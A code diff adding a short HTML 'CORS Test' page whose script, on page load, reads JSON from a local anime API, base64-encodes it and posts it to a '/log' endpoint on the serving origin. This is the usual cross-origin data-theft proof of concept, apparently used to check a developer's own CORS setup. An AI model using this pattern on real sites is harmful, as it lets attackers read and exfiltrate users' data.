@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Test</title>
+</head>
+<body>
+<h1>CORS Test</h1>
+<script>
+    function getData() {
+        fetch('http://127.0.0.1:3000/api/anime')
+            .then(response => response.json())
+            .then(data => {
+                const base64data = btoa(JSON.stringify(data));
+                fetch('/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: base64data }),
+                });
+            });
+    }
+
+    getData();
+</script>
+</body>
+</html>
+
+</html>
